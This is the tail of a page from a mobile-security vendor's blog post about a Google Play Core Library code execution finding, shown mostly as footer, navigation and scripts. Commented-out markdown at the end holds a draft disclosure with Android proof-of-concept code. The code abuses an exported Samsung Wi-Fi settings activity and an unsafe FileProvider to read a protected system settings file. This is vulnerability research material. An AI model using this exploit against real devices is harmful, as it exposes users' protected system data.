                                    <p>secure place</p>
                                
                            </section>
                        </section>
                        <div class="post-full-footer-right">
                            <a class="author-card-button" href="/author/oversecured">Read More</a>
                        </div>
                    
                
                <!-- /author  -->
            </footer>

            <!-- If you use Disqus comments, just uncomment this block.
            The only thing you need to change is "test-apkdzgmqhj" - which
            should be replaced with your own Disqus site-id. -->
            

        </article>

    </div>
</main>

<!-- Links to Previous/Next posts -->
<aside class="read-next outer">
    <div class="inner">
        <div class="read-next-feed">
            

            <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
            
                

    <article class="post-card post-template">
        
            <a class="post-card-image-link" href="/Oversecured-detects-dangerous-vulnerabilities-in-the-TikTok-Android-app/">
                <div class="post-card-image" style="background-image: url(/assets/images/tiktok_back.png)"></div>
            </a>
        
        <div class="post-card-content">
            <a class="post-card-content-link" href="/Oversecured-detects-dangerous-vulnerabilities-in-the-TikTok-Android-app/">
                <header class="post-card-header">
                    

                    <h2 class="post-card-title">Oversecured detects dangerous vulnerabilities in the TikTok Android app</h2>
                </header>
                <section class="post-card-excerpt">
                    
                        <p></p>
                    
                </section>
            </a>
            <footer class="post-card-meta">
                
                    
                        
                        <img class="author-profile-image" src="/assets/images/favicon.ico" alt="oversecured" />
                        
                        <span class="post-card-author">
                            <a href="/author/oversecured/">oversecured</a>
                        </span>
                    
                
                <span class="reading-time">
                    
                    
                      1 min read
                    
                </span>
            </footer>
        </div>
    </article>

            

            <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
            
                

    <article class="post-card post-template">
        
            <a class="post-card-image-link" href="/Android-Access-to-app-protected-components/">
                <div class="post-card-image" style="background-image: url(/assets/images/access_to_app.png)"></div>
            </a>
        
        <div class="post-card-content">
            <a class="post-card-content-link" href="/Android-Access-to-app-protected-components/">
                <header class="post-card-header">
                    

                    <h2 class="post-card-title">Android: Access to app protected components</h2>
                </header>
                <section class="post-card-excerpt">
                    
                        <p></p>
                    
                </section>
            </a>
            <footer class="post-card-meta">
                
                    
                        
                        <img class="author-profile-image" src="/assets/images/favicon.ico" alt="oversecured" />
                        
                        <span class="post-card-author">
                            <a href="/author/oversecured/">oversecured</a>
                        </span>
                    
                
                <span class="reading-time">
                    
                    
                      1 min read
                    
                </span>
            </footer>
        </div>
    </article>

            

        </div>
    </div>
</aside>

<!-- Floating header which appears on-scroll, included from includes/floating-header.hbs -->
<div class="floating-header floating-active">
    <div class="floating-header-logo">
        <a href="/">
            
                <img src="/assets/images/favicon.svg" alt="News, Techniques & Guides icon" />
            
            <span>News, Techniques & Guides</span>
        </a>
    </div>
    <span class="floating-header-divider">&mdash;</span>
    <div class="floating-header-title">Oversecured automatically discovers persistent code execution in the Google Play Core Library</div>
    <div class="floating-header-share">
        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
</svg>
</div>
        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Oversecured+automatically+discovers+persistent+code+execution+in+the+Google+Play+Core+Library&amp;url=https://blog.oversecured.com/Oversecured-automatically-discovers-persistent-code-execution-in-the-Google-Play-Core-Library/"
            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>

        </a>
        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.oversecured.com/Oversecured-automatically-discovers-persistent-code-execution-in-the-Google-Play-Core-Library/"
            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"/></svg>

        </a>
    </div>
    <progress class="progress" value="0">
        <div class="progress-container">
            <span class="progress-bar"></span>
        </div>
    </progress>
</div>


<!-- /post -->

<!-- The #contentFor helper here will send everything inside it up to the matching #block helper found in default.hbs -->


        <!-- Previous/next page links - displayed on every page -->
        

        <!-- The footer at the very bottom of the screen -->
        <footer class="site-footer outer">
            <div class="site-footer-content inner">
                <section class="copyright">
                    <a href="/">Oversecured</a> &copy; 2021 ·
                    <a href="https://oversecured.com/" target="_blank" rel="noopener">Oversecured.com</a> ·
                    <a href="https://oversecured.com/pricing" target="_blank" rel="noopener">Pricing</a> ·
                    <a href="https://oversecured.com/about" target="_blank" rel="noopener">About</a>
                </section>
                <section class="poweredby">
<!--                    <a href="https://jekyllrb.com/">Jekyll</a> &-->
<!--                    <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a> using-->
<!--                    <a href="https://github.com/jekyller/jasper2" target="_blank" rel="noopener">Jasper2</a></section>-->
                </section>
                <nav class="site-footer-nav">
					<a style="display: inline; padding: 0; margin-right: 10px" class="social-link" href="https://linkedin.com/company/Oversecured/" target="_blank" rel="noopener"><?xml version="1.0" encoding="utf-8"?>
<svg version="1.1" id="Linkedin" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px"
	y="0px" viewBox="0 0 32 32" style="enable-background:new 0 0 32 32;" xml:space="preserve">
	<path id="frame" d="M0.72,16.01c0-3.89,0-7.77,0-11.66c0-1.66,1.08-3.06,2.68-3.46c0.29-0.07,0.59-0.11,0.89-0.11
	c7.75-0.01,15.5-0.01,23.24,0c2.01,0,3.58,1.56,3.58,3.56c0,7.76,0,15.52,0,23.28c0,1.98-1.57,3.55-3.55,3.55
	c-7.76,0-15.52,0-23.28,0c-2,0-3.55-1.55-3.56-3.54C0.71,23.76,0.72,19.89,0.72,16.01C0.72,16.01,0.72,16.01,0.72,16.01z
	 M28.74,15.98C28.73,15.98,28.73,15.98,28.74,15.98c0-3.81,0-7.62,0-11.42c0-0.97-0.43-1.39-1.41-1.4c-7.64,0-15.27,0-22.91,0
	c-0.87,0-1.34,0.47-1.34,1.34c0,7.64,0,15.27,0,22.91c0,0.95,0.45,1.4,1.41,1.4c3.15,0,6.3,0,9.46,0c4.48,0,8.97,0,13.45,0
	c0.41,0,0.77-0.1,1.04-0.42c0.26-0.3,0.29-0.66,0.29-1.03C28.73,23.57,28.74,19.78,28.74,15.98z" />
	<path id="n" d="M16.86,25.89c-1.37,0-2.69,0-4.02,0c0-4.47,0-8.92,0-13.39c1.34,0,2.67,0,4.02,0c0,0.57,0,1.12,0,1.75
	c0.16-0.21,0.26-0.36,0.38-0.5c0.79-0.92,1.82-1.36,3-1.48c0.89-0.09,1.78-0.02,2.63,0.26c1.51,0.48,2.3,1.6,2.62,3.08
	c0.14,0.65,0.24,1.32,0.25,1.98c0.03,2.75,0.01,5.51,0.01,8.29c-1.34,0-2.69,0-4.09,0c0-0.12,0-0.25,0-0.38
	c-0.01-2.35,0.01-4.71-0.03-7.06c-0.01-0.53-0.16-1.08-0.34-1.58c-0.22-0.59-0.71-0.92-1.34-1.02c-1.72-0.27-2.91,0.66-3.02,2.47
	c-0.08,1.29-0.06,2.6-0.07,3.89c-0.01,1.09,0,2.18,0,3.26C16.86,25.6,16.86,25.74,16.86,25.89z" />
	<path id="i_1_" d="M10.18,25.9c-1.38,0-2.73,0-4.1,0c0-4.46,0-8.92,0-13.4c1.36,0,2.72,0,4.1,0C10.18,16.96,10.18,21.41,10.18,25.9z
	" />
	<path id="i" d="M5.76,8.16c0.04-1.37,1.13-2.41,2.52-2.38c1.32,0.03,2.4,1.16,2.36,2.48c-0.04,1.36-1.14,2.42-2.49,2.39
	C6.8,10.62,5.72,9.49,5.76,8.16z" />
</svg></a>
                    <a style="display: inline; padding: 0" class="social-link social-link-tw" href="https://twitter.com/OversecuredInc" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
</a>
<!--                    -->
<!--                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>-->
                </nav>
            </div>
        </footer>
    </div>

    <!-- The big email subscribe modal content -->
    

    <!-- highlight.js -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
    <script>$(document).ready(function() {
      $('pre code').each(function(i, block) {
        hljs.highlightBlock(block);
      });
    });</script>

    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
    <script
        src="https://code.jquery.com/jquery-3.2.1.min.js"
        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
        crossorigin="anonymous">
    </script>
    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>


    <!-- Paginator increased to "infinit" in _config.yml -->
    <!-- if paginator.posts  -->
    <!-- <script>
        var maxPages = parseInt('');
    </script>
    <script src="/assets/js/infinitescroll.js"></script> -->
    <!-- /endif -->
<!--    <script type="text/javascript">-->
<!--        const cross = document.querySelector('.link-to-oversecured__cross')-->
<!--        console.log(cross)-->
<!--        console.log('12323')-->
<!--    </script>-->

    


    <!-- Add Google Analytics  -->
    <!-- Google Analytics Tracking code -->
 <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-171786448-1', 'auto');
  ga('send', 'pageview');

 </script>


    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
    
        <script>

// NOTE: Scroll performance is poor in Safari
// - this appears to be due to the events firing much more slowly in Safari.
//   Dropping the scroll event and using only a raf loop results in smoother
//   scrolling but continuous processing even when not scrolling
$(document).ready(function () {
    // Start fitVids
    var $postContent = $(".post-full-content");
    $postContent.fitVids();
    // End fitVids

    var progressBar = document.querySelector('progress');
    var header = document.querySelector('.floating-header');
    var title = document.querySelector('.post-full-title');

    var lastScrollY = window.scrollY;
    var lastWindowHeight = window.innerHeight;
    var lastDocumentHeight = $(document).height();
    var ticking = false;

    function onScroll() {
        lastScrollY = window.scrollY;
        requestTick();
    }

    function onResize() {
        lastWindowHeight = window.innerHeight;
        lastDocumentHeight = $(document).height();
        requestTick();
    }

    function requestTick() {
        if (!ticking) {
            requestAnimationFrame(update);
        }
        ticking = true;
    }

    function update() {
        const noticeToggle = sessionStorage.getItem('notice')
        var trigger = title.getBoundingClientRect().top + window.scrollY;
        var triggerOffset = title.offsetHeight + 35;
        var progressMax = lastDocumentHeight - lastWindowHeight;

        header.style.top = '0'

        // if (window.scrollY > 15 || noticeToggle === false) {
        //     header.style.top = '0'
        // } else if (window.scrollY < 15 && noticeToggle === null) {
        //     header.style.top = '35px'
        // }

        // show/hide floating header
        // if (lastScrollY >= trigger + triggerOffset) {
        //     header.classList.add('floating-active');
        // } else {
        //     header.classList.remove('floating-active');
        // }

        progressBar.setAttribute('max', progressMax);
        progressBar.setAttribute('value', lastScrollY);

        ticking = false;
    }

    window.addEventListener('scroll', onScroll, {passive: true});
    window.addEventListener('resize', onResize, false);

    update();
});
</script>

    

    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
    <!-- ghost_foot -->
    <div class="gdpr-notice">
        <p class="gdpr-notice__text">This website uses cookies to improve your experience. See our <a class="gdpr-notice__link" href="https://oversecured.com/privacy" target="_blank">Privacy Policy</a> to learn more.</p>
        <button class="gdpr-notice__btn-accept">Accept</button>
    </div>

    <script src="/assets/js/toggleHeaderNotice.js"></script>
    <script src="/assets/js/gdprNoticeToggle.js"></script>
    <script src="/assets/anchorjs-4.3.1/anchor.min.js"></script>

    <script>
        const addAnchorsToHeadings = () => {
            anchors.options.visible = 'visible';
            anchors.options.ariaLabel = 'h1';
            anchors.options.placement = 'left';
            anchors.options.icon = '#';
            anchors.options.class = 'anchor-item';
            anchors.add('.heading-anchor');
        }

        addAnchorsToHeadings()
    </script>

<!--todo-->
<!--[comment]: <> ([Output from Oversecured's vulnerability scanner]&#40;#output-from-oversecured’s-vulnerability-scanner&#41;)-->

<!--[comment]: <> ({:.heading-anchor})-->

<!--[comment]: <> (- For SecSettings)-->

<!--[comment]: <> (<img class="post-template__vulnearbility-image" src="/assets/images/SecSettings.png" alt="vulnerability"/>)-->

<!--[comment]: <> (- For an unsafe FileProvider in `com.sec.imsservice`:)-->

<!--[comment]: <> (<img class="post-template__vulnearbility-image" src="/assets/images/imsservice.png" alt="vulnerability"/>)-->

<!--[comment]: <> ([Steps followed to exploit this vulnerability:]&#40;#steps-followed-to-exploit-this-vulnerability&#41;)-->

<!--[comment]: <> ({:.heading-anchor})-->

<!--[comment]: <> (1. The activity `com.android.settings.wifi.WifiDialogActivity` is exported &#40;however, it does request the sender to enable the `android.permission.CHANGE_WIFI_STATE` permission&#41;.)-->

<!--[comment]: <> (2. It launches an implicit intent and passes the activity result to its own `setResult&#40;code, attacker_controlled_intent&#41;`.)-->

<!--[comment]: <> (3. When the victim clicks on "Add network" -> "QR scan" and selects the attacker's app, the app will get read/write access to arbitrary system files.)-->

<!--[comment]: <> (The attack looks like this:)-->

<!--[comment]: <> (1. Launching an activity to add a network)-->

<!--[comment]: <> (File `AndroidManifest.xml`)-->

<!--[comment]: <> (```xml)-->

<!--[comment]: <> (<uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />)-->

<!--[comment]: <> (```)-->

<!--[comment]: <> ({:.code-markdown})-->

<!--[comment]: <> (File `MainActivity.java`)-->

<!--[comment]: <> (```java)-->

<!--[comment]: <> (protected void onCreate&#40;Bundle savedInstanceState&#41; {)-->

<!--[comment]: <> (   super.onCreate&#40;savedInstanceState&#41;;)-->

<!--[comment]: <> (   Intent i = new Intent&#40;&#41;;)-->

<!--[comment]: <> (   i.setClassName&#40;"com.android.settings", "com.android.settings.wifi.WifiDialogActivity"&#41;;)-->

<!--[comment]: <> (   startActivityForResult&#40;i, 0&#41;;)-->

<!--[comment]: <> (})-->

<!--[comment]: <> (protected void onActivityResult&#40;int requestCode, int resultCode, Intent data&#41; {)-->

<!--[comment]: <> (   super.onActivityResult&#40;requestCode, resultCode, data&#41;;)-->

<!--[comment]: <> (   try {)-->

<!--[comment]: <> (       Log.d&#40;"evil", IOUtils.toString&#40;getContentResolver&#40;&#41;.openInputStream&#40;data.getData&#40;&#41;&#41;&#41;&#41;;)-->

<!--[comment]: <> (   } catch &#40;Throwable th&#41; {)-->

<!--[comment]: <> (       throw new RuntimeException&#40;th&#41;;)-->

<!--[comment]: <> (   })-->

<!--[comment]: <> (})-->

<!--[comment]: <> (```)-->

<!--[comment]: <> ({:.code-markdown})-->

<!--[comment]: <> (2. Returning an attacker-controlled intent)-->

<!--[comment]: <> (File `AndroidManifest.xml`)-->

<!--[comment]: <> (```xml)-->

<!--[comment]: <> (<activity android:name=".PickerActivity">)-->

<!--    [comment]: <> (   <intent-filter android:autoVerify="true" android:priority="999">)-->

<!--        [comment]: <> (       <action android:name="android.settings.WIFI_DPP_ENROLLEE_QR_CODE_SCANNER" />)-->

<!--        [comment]: <> (       <category android:name="android.intent.category.DEFAULT" />)-->

<!--        [comment]: <> (   </intent-filter>)-->

<!--    [comment]: <> (</activity>)-->

<!--[comment]: <> (```)-->

<!--[comment]: <> ({:.code-markdown})-->

<!--[comment]: <> (File `PickerActivity.java`)-->

<!--[comment]: <> (```java)-->

<!--[comment]: <> (protected void onCreate&#40;Bundle savedInstanceState&#41; {)-->

<!--[comment]: <> (   super.onCreate&#40;savedInstanceState&#41;;)-->

<!--[comment]: <> (   Intent i = new Intent&#40;"evil"&#41;;)-->

<!--[comment]: <> (   i.setData&#40;Uri.parse&#40;"content://com.sec.internal.ims.rcs.fileprovider/root/data/system/users/0/settings_secure.xml"&#41;&#41;;)-->

<!--[comment]: <> (   i.setFlags&#40;Intent.FLAG_GRANT_READ_URI_PERMISSION&#41;;)-->

<!--[comment]: <> (   setResult&#40;-1, i&#41;;)-->

<!--[comment]: <> (   finish&#40;&#41;;)-->

<!--[comment]: <> (})-->

<!--[comment]: <> (```)-->

<!--[comment]: <> ({:.code-markdown})-->

<!--[comment]: <> (As a result, the content of the file `/data/system/users/0/settings_secure.xml` appeared in the logs.)-->

<!--[comment]: <> ({:.markdown-in-single-quotes})-->
</body>
</html>
